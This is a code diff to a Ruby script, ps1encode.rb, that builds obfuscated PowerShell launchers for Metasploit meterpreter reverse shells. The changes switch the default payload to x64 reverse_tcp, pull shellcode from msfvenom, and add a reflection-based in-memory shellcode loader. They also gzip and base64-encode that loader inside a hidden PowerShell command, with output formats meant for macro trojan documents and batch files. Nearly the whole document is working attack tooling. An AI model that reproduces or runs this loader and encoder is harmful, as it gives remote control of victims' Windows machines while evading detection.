@@ -9,7 +9,7 @@
 #    
 #
 #    Available output types:
-# => raw (encoded payload only - no powershell run options)
+# => raw (plaintext powershell payload only - no base64 encoding)
 # => cmd (for use with bat files)
 # => vba (for use with macro trojan docs)
 # => vbs (for use with vbs scripts)
@@ -33,17 +33,19 @@
 
 require 'optparse'
 require 'base64'
+require 'zlib'
+require 'stringio'
 
 options = {}
 
 optparse = OptionParser.new do|opts|
 
-    opts.banner = "Usage: ps1encode.rb --LHOST [default = 127.0.0.1] --LPORT [default = 443] --PAYLOAD [default = windows/meterpreter/reverse_https] --ENCODE [default = cmd] --32bitexe"
+    opts.banner = "Usage: ps1encode.rb --LHOST [default = 127.0.0.1] --LPORT [default = 4444] --PAYLOAD [default = windows/x64/meterpreter/reverse_tcp] --ENCODE [default = cmd] --32bitexe"
     opts.separator ""
     
     options[:LHOST] = "127.0.0.1"
-    options[:LPORT] = "443"
-    options[:PAYLOAD] = "windows/meterpreter/reverse_https"
+    options[:LPORT] = "4444"
+    options[:PAYLOAD] = "windows/x64/meterpreter/reverse_tcp"
     options[:ENCODE] = "cmd"
     options[:ARCH] = "64"
 
@@ -96,7 +98,7 @@ def gen_PS_shellcode()
     resultsS = ""
 
     #generate the shellcode via msfvenom and write to a temp txt file
-    system("msfvenom -p #{$lpayload} LHOST=#{$lhost} LPORT=#{$lport} --arch x86 --platform windows --smallest -f raw > raw_shellcode_temp")
+    system("msfvenom -p #{$lpayload} LHOST=#{$lhost} LPORT=#{$lport} --platform windows --smallest -f raw > raw_shellcode_temp")
 
     #taking raw shellcode, each byte goes into array
     File.open('raw_shellcode_temp').each_byte do |b|
@@ -107,19 +109,64 @@ def gen_PS_shellcode()
     system("rm raw_shellcode_temp")
 
     #go through the array, convert each byte in the array to a hex string
-    results.each do |i|
-        resultsS = resultsS + i.to_s.to_hex + ","
-    end
+    #results.each do |i|
+    #    resultsS = resultsS + i.to_s.to_hex + ","
+    #end
 
     #remove last unnecessary comma
-    resultsS = resultsS.chop
+    #resultsS = resultsS.chop
     
     #powershell script to be executed pre-encode
-    finstring = "$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = #{resultsS};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";$cmd = \"-nop -noni -enc \";iex \"& $x86 $cmd $gq\"}else{$cmd = \"-nop -noni -enc\";iex \"& powershell $cmd $gq\";}"
+    #finstring = "$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = #{resultsS};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";$cmd = \"-nop -noni -enc \";iex \"& $x86 $cmd $gq\"}else{$cmd = \"-nop -noni -enc\";iex \"& powershell $cmd $gq\";}"
+
+    #convert array of shellcode to byte stream, then base64 pa
+    byteZ = results.pack('C*')
+    byteZZ = Base64.encode64(byteZ).gsub(/\n/, '')
+
+    templateX = %{function dw0 {
+        Param ($hpP, $xnSTF)        
+        $e0Nr = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+        
+        return $e0Nr.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($e0Nr.GetMethod('GetModuleHandle')).Invoke($null, @($hpP)))), $xnSTF))
+    }
+
+    function of {
+        Param (
+            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $doW,
+            [Parameter(Position = 1)] [Type] $wo = [Void]
+        )
+        
+        $pBL = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+        $pBL.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $doW).SetImplementationFlags('Runtime, Managed')
+        $pBL.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $wo, $doW).SetImplementationFlags('Runtime, Managed')
+        
+        return $pBL.CreateType()
+    }
+
+    [Byte[]]$es = [System.Convert]::FromBase64String("#{byteZZ}")
+            
+    $jpSe_ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dw0 kernel32.dll VirtualAlloc), (of @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $es.Length,0x3000, 0x40)
+    [System.Runtime.InteropServices.Marshal]::Copy($es, 0, $jpSe_, $es.length)
+
+    $le2_ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dw0 kernel32.dll CreateThread), (of @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$jpSe_,[IntPtr]::Zero,0,[IntPtr]::Zero)
+    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dw0 kernel32.dll WaitForSingleObject), (of @([IntPtr], [Int32]))).Invoke($le2_,0xffffffff) | Out-Null
+    }
+
+    #templateX needs to be gzip compressed, then base64
+    #https://stackoverflow.com/a/1366187
+    #gZ = Zlib::GzipWriter.new(StringIO.new(templateX.to_s)) 
+    eee = ""
+    gZ = Zlib::GzipWriter.new(StringIO.new(eee.to_s))
+    gZ.write templateX
+    gZ.close
+
+    resp = Base64.encode64(eee).gsub(/\n/, '')
+
+    templateX1 = "if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''#{resp}''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
 
     #convert to UTF-16 (powershell interprets base64 of UTF-16)
     ec = Encoding::Converter.new("UTF-8", "UTF-16LE")
-    utfEncoded =  ec.convert(finstring)
+    utfEncoded =  ec.convert(templateX1)
 
     #string to base64 - final
     finPS = Base64.encode64(utfEncoded).gsub(/\n/, '')
@@ -127,6 +174,12 @@ def gen_PS_shellcode()
     return finPS
 end
 
+def gen_PS_prefix(ps_base64code)
+    
+    prefix = "powershell -nop -win Hidden -noni -enc " + ps_base64code
+    #prefix = "\%COMSPEC\% /b /c start /b /min powershell.exe -nop -w hidden -e " + ps_base64code
+    return prefix
+end
 
 def prep_PS_chunk(ps_shellcode)
     #The below iterates through the string and chops up strings into 254 character lengths & puts it into a 2-dimensional array   
@@ -151,7 +204,12 @@ end
 if $lencode == "raw"
 
     powershell_encoded = gen_PS_shellcode()
-    puts powershell_encoded
+
+    #code here will base64 decode and show powershell
+    revme = powershell_encoded
+    revme2 = Base64.decode64(revme)
+
+    puts revme2
 
 end
 
@@ -159,7 +217,9 @@ end
 if $lencode == "cmd"
 
     powershell_encoded = gen_PS_shellcode()
-    puts "powershell -nop -win Hidden -noni -enc " + powershell_encoded
+    psopt = gen_PS_prefix(powershell_encoded)
+    #puts "powershell -nop -win Hidden -noni -enc " + powershell_encoded
+    puts psopt 
 
 end
 
